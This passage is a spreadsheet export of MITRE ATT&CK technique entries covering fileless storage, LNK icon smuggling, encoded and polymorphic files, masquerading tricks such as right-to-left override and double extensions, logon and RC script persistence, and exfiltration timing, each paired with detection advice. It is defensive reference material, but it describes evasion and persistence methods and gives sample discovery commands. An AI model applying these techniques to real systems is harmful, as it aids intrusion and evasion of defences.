Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware 23022)
Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.
Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\System32\Wbem\Repository`) or Registry (e.g., `%SystemRoot%\System32\Config`) physical files.(Citation: Microsoft Fileless) </t>
  </si>
  <si>
    <t>T1027.012</t>
  </si>
  <si>
    <t>LNK Icon Smuggling (T1027.012)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. 
Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation: Booby Trap Shortcut 2017)
LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads. 
</t>
  </si>
  <si>
    <t xml:space="preserve">
</t>
  </si>
  <si>
    <t>T1027.013</t>
  </si>
  <si>
    <t>Encrypted/Encoded File (T1027.013)</t>
  </si>
  <si>
    <t>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Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.
This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.
The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.
For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) 
Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.</t>
  </si>
  <si>
    <t>T1027.014</t>
  </si>
  <si>
    <t>Polymorphic Code (T1027.014)</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, File: File Creation, File: File Metadata</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution.(Citation: polymorphic-blackberry) With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools.(Citation: polymorphic-sentinelone) 
Other obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010), or [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013).(Citation: polymorphic-linkedin)(Citation: polymorphic-medium)
</t>
  </si>
  <si>
    <t>T1029</t>
  </si>
  <si>
    <t>Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.
When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).</t>
  </si>
  <si>
    <t>Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.</t>
  </si>
  <si>
    <t>T1030</t>
  </si>
  <si>
    <t>An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.</t>
  </si>
  <si>
    <t>Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1033</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Access, Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution, Process: Process Access, Process: Process Creation, Windows Registry: Windows Registry Key Access</t>
  </si>
  <si>
    <t>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Various utilities and commands may acquire this information, including &lt;code&gt;whoami&lt;/code&gt;. In macOS and Linux, the currently logged in user can be identified with &lt;code&gt;w&lt;/code&gt; and &lt;code&gt;who&lt;/code&gt;. On macOS the &lt;code&gt;dscl . list /Users | grep -v '_'&lt;/code&gt; command can also be used to enumerate user accounts. Environment variables, such as &lt;code&gt;%USERNAME%&lt;/code&gt; and &lt;code&gt;$USER&lt;/code&gt;, may also be used to access this information.
On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)</t>
  </si>
  <si>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`show` commands being run by non-standard users from non-standard locations.</t>
  </si>
  <si>
    <t>T1036</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, File: File Modification, Image: Image Metadata, Process: OS API Execution, Process: Process Creation, Process: Process Metadata, Scheduled Job: Scheduled Job Metadata, Scheduled Job: Scheduled Job Modification, Service: Service Creation, Service: Service Metadata, User Account: User Account Creation</t>
  </si>
  <si>
    <t>Containers, Linux, Windows, macOS</t>
  </si>
  <si>
    <t>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
Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)</t>
  </si>
  <si>
    <t>Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.
If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)
Look for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters"\u202E", "[U+202E]", and "%E2%80%AE”.</t>
  </si>
  <si>
    <t>T1036.001</t>
  </si>
  <si>
    <t>Invalid Code Signature (T1036.001)</t>
  </si>
  <si>
    <t>Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)
Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.</t>
  </si>
  <si>
    <t>Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers.</t>
  </si>
  <si>
    <t>T1036.002</t>
  </si>
  <si>
    <t>Right-to-Left Override (T1036.002)</t>
  </si>
  <si>
    <t>Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named &lt;code&gt;March 25 \u202Excod.scr&lt;/code&gt; will display as &lt;code&gt;March 25 rcs.docx&lt;/code&gt;. A JavaScript file named &lt;code&gt;photo_high_re\u202Egnp.js&lt;/code&gt; will be displayed as &lt;code&gt;photo_high_resj.png&lt;/code&gt;.(Citation: Infosecinstitute RTLO Technique)
Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.</t>
  </si>
  <si>
    <t>Detection methods should include looking for common formats of RTLO characters within filenames such as &lt;code&gt;\u202E&lt;/code&gt;, &lt;code&gt;[U+202E]&lt;/code&gt;, and &lt;code&gt;%E2%80%AE&lt;/code&gt;. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it.</t>
  </si>
  <si>
    <t>T1036.003</t>
  </si>
  <si>
    <t>Rename System Utilities (T1036.003)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, File: File Modification, Process: Process Metadata</t>
  </si>
  <si>
    <t>Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename &lt;code&gt;rundll32.exe&lt;/code&gt;). (Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)</t>
  </si>
  <si>
    <t>If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)</t>
  </si>
  <si>
    <t>T1036.004</t>
  </si>
  <si>
    <t>Masquerade Task or Service (T1036.004)</t>
  </si>
  <si>
    <t>Command: Command Execution, Scheduled Job: Scheduled Job Metadata, Scheduled Job: Scheduled Job Modification, Service: Service Creation, Service: Service Metadata</t>
  </si>
  <si>
    <t>Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.
Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)</t>
  </si>
  <si>
    <t>Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.</t>
  </si>
  <si>
    <t>T1036.005</t>
  </si>
  <si>
    <t>Match Legitimate Name or Location (T1036.005)</t>
  </si>
  <si>
    <t>File: File Metadata, Image: Image Metadata, Process: Process Creation, Process: Process Metadata</t>
  </si>
  <si>
    <t>Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.
Adversaries may also use the same icon of the file they are trying to mimic.</t>
  </si>
  <si>
    <t>Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.
If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)
In containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.</t>
  </si>
  <si>
    <t>T1036.006</t>
  </si>
  <si>
    <t>Space after Filename (T1036.006)</t>
  </si>
  <si>
    <t>Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.
For example, if there is a Mach-O executable file called &lt;code&gt;evil.bin&lt;/code&gt;, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to &lt;code&gt;evil.txt&lt;/code&gt;, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to &lt;code&gt;evil.txt &lt;/code&gt; (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).
Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.</t>
  </si>
  <si>
    <t>It's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.</t>
  </si>
  <si>
    <t>T1036.007</t>
  </si>
  <si>
    <t>Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: &lt;code&gt;File.txt.exe&lt;/code&gt; may render in some views as just &lt;code&gt;File.txt&lt;/code&gt;). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) 
Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user’s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named &lt;code&gt;Evil.txt.exe&lt;/code&gt; may display as &lt;code&gt;Evil.txt&lt;/code&gt; to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)
Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.</t>
  </si>
  <si>
    <t>Monitor for files written to disk that contain two file extensions, particularly when the second is an executable.(Citation: Seqrite DoubleExtension)</t>
  </si>
  <si>
    <t>T1036.008</t>
  </si>
  <si>
    <t>Masquerade File Type (T1036.008)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification</t>
  </si>
  <si>
    <t>Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is &lt;code&gt; 0xFF 0xD8&lt;/code&gt; and the file extension is either `.JPE`, `.JPEG` or `.JPG`. 
Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. 
Common non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of &lt;code&gt;test.gif&lt;/code&gt;. A user may not know that a file is malicious due to the benign appearance and file extension.
Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)</t>
  </si>
  <si>
    <t>T1036.009</t>
  </si>
  <si>
    <t>Break Process Trees (T1036.009)</t>
  </si>
  <si>
    <t>Process: OS API Execution, Process: Process Creation</t>
  </si>
  <si>
    <t xml:space="preserve">An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the “parent-child" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.(Citation: 3OHA double-fork 2022) 
On Linux systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106) calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.
Another example is using the “daemon” syscall to detach from the current parent process and run in the background.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022) </t>
  </si>
  <si>
    <t>T1036.010</t>
  </si>
  <si>
    <t>Masquerade Account Name (T1036.010)</t>
  </si>
  <si>
    <t>User Account: User Account Creation</t>
  </si>
  <si>
    <t>Containers, IaaS, Identity Provider, Linux, Office Suite, SaaS, Windows, macOS</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during [Create Account](https://attack.mitre.org/techniques/T1136), although accounts may also be renamed at a later date. This may also coincide with [Account Access Removal](https://attack.mitre.org/techniques/T1531) if the actor first deletes an account before re-creating one with the same name.(Citation: Huntress MOVEit 2023)
Often, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management.(Citation: Elastic CUBA Ransomware 2022)(Citation: Aquasec Kubernetes Attack 2023) They may also give accounts generic, trustworthy names, such as “admin”, “help”, or “root.”(Citation: Invictus IR Cloud Ransomware 2024) Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior to [Account Discovery](https://attack.mitre.org/techniques/T1087).  
Note that this is distinct from [Impersonation](https://attack.mitre.org/techniques/T1656), which describes impersonating specific trusted individuals or organizations, rather than user or service account names.  </t>
  </si>
  <si>
    <t>T1037</t>
  </si>
  <si>
    <t>Persistence, Privilege Escalation</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation</t>
  </si>
  <si>
    <t>Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  
Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. 
An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.</t>
  </si>
  <si>
    <t>Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.</t>
  </si>
  <si>
    <t>T1037.001</t>
  </si>
  <si>
    <t>Logon Script (Windows) (T1037.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the &lt;code&gt;HKCU\Environment\UserInitMprLogonScript&lt;/code&gt; Registry key.(Citation: Hexacorn Logon Scripts)
Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. </t>
  </si>
  <si>
    <t>Monitor for changes to Registry values associated with Windows logon scrips, nameley &lt;code&gt;HKCU\Environment\UserInitMprLogonScript&lt;/code&gt;.
Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.</t>
  </si>
  <si>
    <t>T1037.002</t>
  </si>
  <si>
    <t>Login Hook (T1037.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation</t>
  </si>
  <si>
    <t>macOS</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the &lt;code&gt;/Library/Preferences/com.apple.loginwindow.plist&lt;/code&gt; file and can be modified using the &lt;code&gt;defaults&lt;/code&gt; command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) 
Adversaries can add or insert a path to a malicious script in the &lt;code&gt;com.apple.loginwindow.plist&lt;/code&gt; file, using the &lt;code&gt;LoginHook&lt;/code&gt; or &lt;code&gt;LogoutHook&lt;/code&gt; key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)
**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) </t>
  </si>
  <si>
    <t>T1037.003</t>
  </si>
  <si>
    <t>Network Logon Script (T1037.003)</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  
Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.</t>
  </si>
  <si>
    <t>T1037.004</t>
  </si>
  <si>
    <t>RC Scripts (T1037.004)</t>
  </si>
  <si>
    <t>Linux, Network, macOS</t>
  </si>
  <si>
    <t>Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.
Adversaries can establish persistence by adding a malicious binary path or shell commands to &lt;code&gt;rc.local&lt;/code&gt;, &lt;code&gt;rc.common&lt;/code&gt;, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.
Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware)
Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for unexpected changes to RC scripts in the &lt;code&gt;/etc/&lt;/code&gt; directory. Monitor process execution resulting from RC scripts for unusual or unknown applications or behavior.
Monitor for &lt;code&gt;/etc/rc.local&lt;/code&gt; file creation. Although types of RC scripts vary for each Unix-like distribution, several execute &lt;code&gt;/etc/rc.local&lt;/code&gt; if present. </t>
  </si>
  <si>
    <t>T1037.005</t>
  </si>
  <si>
    <t>Startup Items (T1037.005)</t>
  </si>
  <si>
    <t>Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)
This is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, &lt;code&gt;/Library/StartupItems&lt;/code&gt; isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), &lt;code&gt;StartupParameters.plist&lt;/code&gt;, reside in the top-level directory. 
An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.</t>
  </si>
  <si>
    <t>The &lt;code&gt;/Library/StartupItems&lt;/code&gt; folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.
Monitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.</t>
  </si>
  <si>
    <t>T1039</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Network Share: Network Share Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).</t>
  </si>
  <si>
    <t>T1040</t>
  </si>
  <si>
    <t>Credential Access, Discovery</t>
  </si>
  <si>
    <t>IaaS, Linux, Network, Windows, macOS</t>
  </si>
  <si>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</si>
  <si>
    <t>Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.
In cloud-based environments, monitor for the creation of new traffic mirrors or modification of existing traffic mirrors. For network infrastructure devices, collect AAA logging to monitor for the capture of network traffic.</t>
  </si>
  <si>
    <t>T1041</t>
  </si>
  <si>
    <t>Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.</t>
  </si>
  <si>
    <t>T1046</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Enumeration, Command: Command Execution, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Containers, IaaS, Linux, Network, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   
Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.
Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as &lt;code&gt;dns-sd -B _ssh._tcp .&lt;/code&gt;) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)</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</si>
